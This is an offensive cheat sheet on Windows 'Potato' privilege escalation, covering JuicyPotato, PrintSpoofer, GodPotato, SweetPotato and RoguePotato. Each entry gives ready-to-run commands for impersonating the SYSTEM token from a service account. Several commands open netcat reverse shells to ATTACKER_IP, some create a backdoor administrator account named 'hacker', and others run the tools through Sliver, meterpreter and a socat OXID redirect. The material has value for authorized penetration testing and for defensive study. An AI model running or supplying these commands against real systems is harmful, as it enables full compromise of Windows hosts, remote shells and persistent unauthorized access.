# Windows -- Potato Privilege Escalation Attacks

### JuicyPotato (SeImpersonatePrivilege + COM Server Abuse) [added: 2026-04]
- **Tags:** #JuicyPotato #SeImpersonatePrivilege #COM #CLSID #PotatoAttack #PrivEsc #Windows #winPEAS #TokenAbuse
- **Trigger:** `whoami /priv` shows SeImpersonatePrivilege enabled on a Windows Server 2016 or 2019 host (does NOT work on Server 2022+)
- **Prereq:** Shell as a service account (IIS APPPOOL, MSSQL, etc.) with SeImpersonatePrivilege + target running Windows Server 2016/2019 or Windows 10 (build < 1809) + valid CLSID for the target OS
- **Yields:** Command execution as NT AUTHORITY\SYSTEM via COM object token impersonation
- **Opsec:** Med
- **Context:** Service accounts like IIS application pools and MSSQL typically hold SeImpersonatePrivilege. JuicyPotato abuses the COM server to create a process with a SYSTEM token. You need a valid CLSID for the target OS version -- if the default CLSID fails, try others from the JuicyPotato GitHub CLSID list. This technique is patched on Server 2022 and newer Windows 10 builds, so check the OS version first with `systeminfo`.
- **Payload/Method:**
```powershell
# Confirm privilege
whoami /priv
# Look for: SeImpersonatePrivilege  Enabled

# Check OS version (must be Server 2016/2019 or Win10 < 1809)
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Upload JuicyPotato binary
# Default CLSID for Windows Server 2016: {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Default CLSID for Windows Server 2019: {03ca98d6-ff5d-49b8-abc6-03dd84127020}

# Execute reverse shell as SYSTEM
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe ATTACKER_IP 4444" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# Execute a local binary as SYSTEM
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\output.txt" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

# If CLSID fails, enumerate valid CLSIDs:
# https://github.com/ohpe/juicy-potato/tree/master/CLSID
```

### PrintSpoofer (Named Pipe Impersonation via Print Spooler) [added: 2026-04]
- **Tags:** #PrintSpoofer #SeImpersonatePrivilege #NamedPipe #PrintSpooler #PrivEsc #Windows #PotatoAttack #TokenAbuse #Server2019
- **Trigger:** `whoami /priv` shows SeImpersonatePrivilege on Windows 10 (1809+) or Server 2019+ where JuicyPotato CLSID abuse no longer works
- **Prereq:** Shell as service account with SeImpersonatePrivilege + Windows 10 build 1809+ or Server 2019/2022 + Print Spooler service running (default on most Windows)
- **Yields:** Command execution or interactive shell as NT AUTHORITY\SYSTEM
- **Opsec:** Med
- **Context:** PrintSpoofer was created as the successor to JuicyPotato for newer Windows builds where DCOM/CLSID abuse was mitigated. It creates a named pipe and triggers the print spooler to connect to it, then impersonates the SYSTEM token from that connection. Works on Server 2019 and 2022 out of the box. Simpler than JuicyPotato since no CLSID hunting is needed.
- **Payload/Method:**
```powershell
# Verify privilege and OS version
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Check Print Spooler is running
sc query Spooler

# Interactive SYSTEM shell
.\PrintSpoofer64.exe -i -c cmd

# Execute a specific command as SYSTEM
.\PrintSpoofer64.exe -c "c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"

# If running from a non-interactive service context (e.g., mssql xp_cmdshell):
.\PrintSpoofer64.exe -c "cmd /c whoami > c:\temp\whoami.txt"
```

### GodPotato (.NET-based Universal Potato) [added: 2026-04]
- **Tags:** #GodPotato #SeImpersonatePrivilege #DotNet #PrivEsc #Windows #PotatoAttack #Server2022 #UniversalPotato #TokenAbuse
- **Trigger:** `whoami /priv` shows SeImpersonatePrivilege on a fully patched Windows system (including Server 2022) where PrintSpoofer or other potatoes fail, and .NET 4.x is installed
- **Prereq:** Shell as service account with SeImpersonatePrivilege + .NET Framework 4.x installed on target + works on Windows Server 2012 through Server 2022 and Windows 8 through Windows 11
- **Yields:** Arbitrary command execution as NT AUTHORITY\SYSTEM
- **Opsec:** Med
- **Context:** GodPotato is the most universal potato variant as of 2024. It exploits a flaw in the .NET DCOM RPCSS interaction and works across all modern Windows versions including fully patched Server 2022 and Windows 11, provided .NET 4.x is present. It is the go-to when JuicyPotato is too old, PrintSpoofer is patched, and SweetPotato fails. Choose the binary matching the installed .NET CLR version.
- **Payload/Method:**
```powershell
# Confirm SeImpersonatePrivilege
whoami /priv

# Check .NET version installed
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full" /v Release
dir C:\Windows\Microsoft.NET\Framework64\v4*

# Run command as SYSTEM (use GodPotato-NET4.exe for .NET 4.x)
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Reverse shell as SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c c:\temp\nc.exe -e cmd.exe ATTACKER_IP 4444"

# Add admin user
.\GodPotato-NET4.exe -cmd "net user hacker Password123! /add && net localgroup administrators hacker /add"

# For .NET 2.x targets, use GodPotato-NET2.exe
# For .NET 3.5 targets, use GodPotato-NET35.exe
```

### SweetPotato (Combined Potato Variant) [added: 2026-04]
- **Tags:** #SweetPotato #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege #WinRM #COM #PrivEsc #Windows #PotatoAttack #TokenAbuse #Sliver
- **Trigger:** `whoami /priv` shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege and you want a single tool that tries multiple potato techniques automatically
- **Prereq:** Shell as service account with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege + Windows 7 through Server 2022 (different techniques apply to different versions)
- **Yields:** Command execution as NT AUTHORITY\SYSTEM by attempting multiple impersonation techniques in sequence
- **Opsec:** Med
- **Context:** SweetPotato combines multiple impersonation techniques (WinRM BITS, EfsPotato, PrintSpoofer-like pipe) into a single executable. It tries each method sequentially until one succeeds. This is useful when you are unsure which specific potato variant will work on the target. The tool can be loaded as a .NET assembly via Sliver's execute-assembly or Cobalt Strike's execute-assembly.
- **Payload/Method:**
```powershell
# Run SweetPotato with default (tries all methods)
.\SweetPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\out.txt"

# Specify WinRM method explicitly
.\SweetPotato.exe -e WinRM -p c:\windows\system32\cmd.exe -a "/c net user hacker Pass123! /add"

# Specify EfsPotato method
.\SweetPotato.exe -e EfsPotato -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe ATTACKER_IP 4444 -e cmd"

# Via Sliver C2 (as .NET assembly)
[server] sliver (session) > execute-assembly /path/to/SweetPotato.exe "-p c:\windows\system32\cmd.exe -a \"/c whoami\""

# Via meterpreter
meterpreter > execute -f SweetPotato.exe -a "-p cmd.exe -a \"/c whoami\""
```

### RoguePotato (Remote OXID Resolver) [added: 2026-04]
- **Tags:** #RoguePotato #SeImpersonatePrivilege #OXID #DCOM #PrivEsc #Windows #PotatoAttack #TokenAbuse #socat #RemoteOXID
- **Trigger:** `whoami /priv` shows SeImpersonatePrivilege but JuicyPotato CLSIDs fail and PrintSpoofer is unavailable or blocked
- **Prereq:** Shell as service account with SeImpersonatePrivilege + attacker-controlled machine reachable from target on TCP port 135 + socat or similar port forwarder on attacker machine
- **Yields:** Command execution as NT AUTHORITY\SYSTEM via remote OXID resolution trick
- **Opsec:** High
- **Context:** RoguePotato is a JuicyPotato successor designed for scenarios where local OXID resolution is blocked (newer Windows patches). It redirects the DCOM OXID resolution to an attacker-controlled machine running a fake OXID resolver, then impersonates the resulting SYSTEM token. Requires network connectivity from the target to your attacker machine on port 135, so it may not work in segmented networks. Use socat on the attacker machine to redirect port 135 to RoguePotato's listening port.
- **Payload/Method:**
```bash
# ATTACKER MACHINE: Set up OXID resolver redirect with socat
# Forward port 135 to RoguePotato's default port 9999
sudo socat tcp-listen:135,reuseaddr,fork tcp:ATTACKER_IP:9999 &
```
```powershell
# TARGET MACHINE: Run RoguePotato
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c whoami > c:\temp\out.txt" -l 9999

# Reverse shell variant
.\RoguePotato.exe -r ATTACKER_IP -e "c:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe" -l 9999

# If port 135 outbound is blocked, try alternate ports (requires matching socat config)
.\RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c whoami" -l 9999 -p 9998
```
